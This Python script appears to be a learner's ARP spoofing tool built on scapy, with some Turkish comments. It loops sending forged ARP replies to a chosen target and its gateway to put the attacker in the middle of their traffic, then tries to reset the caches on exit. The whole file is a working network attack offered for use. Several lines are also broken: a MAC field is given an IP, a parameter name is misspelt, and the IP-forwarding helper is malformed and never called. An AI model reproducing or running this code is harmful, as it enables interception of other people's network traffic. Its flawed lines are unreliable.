import optparse
import scapy.all as scapy
import subprocess
import time

def user_input_data():
    parser_object=optparse.OptionParser()

    parser_object.add_option("-t","--target",dest="target_ip_address",help="please enter target ip address!")
    parser_object.add_option("-g","--gateway",dest="gateway_ip_address",help="please enter gateway ip address!")

    options=parser_object.parse_args()[0]
    if not options.target_ip_address:
        print("Enter target IP")
    if not options.gateway_ip_address:
        print("Enter gateway IP")

    return options

def ip_forward():
    subprocess.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])

def arp_poisoning(target_ip,poisoned_ip):
    target_mac = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_ip,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)

def reset_oparation(fooled_ip,gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    fooled_mac = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac,psrc=gateway_ip,hwdsc=gateway_mac)
    scapy.send(fooled_mac,verbose=False,count=6) # eğer count ile değer girilirse gidecek paket sayısını gösterir

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst = ip)
    broadcast_packet = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    combined_packet = broadcast_packet/arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1,verbose=False)[0]
    #print(list(answered_list[0][0])) #0,0 kullanarak çıkan sonucu gğnceller kısaltır
    #print(answered_list[0][1].hwsrc)
    #answered_list.summary()

    return answered_list[0][1].hwsrc
print("Program started!")

user_ips=user_input_data()
user_target_ip=user_ips.target_ip_address
user_gateway_ip=user_ips.gateway_ip_address


try:
    while True:
        number=0
        # get_mac_address("192.168.43.208")
        arp_poisoning(user_target_ip,user_gateway_ip)  # AWİndows kandırma
        arp_poisoning(user_gateway_ip,user_target_ip)  # Modem kandırma
        time.sleep(3)
        number+=2
        print("\rSending Packets!"+str(number),end="")
except KeyboardInterrupt:
    print("\Quit and Reset")
    reset_oparation(user_target_ip,user_gateway_ip)
    reset_oparation(user_gateway_ip,user_target_ip)




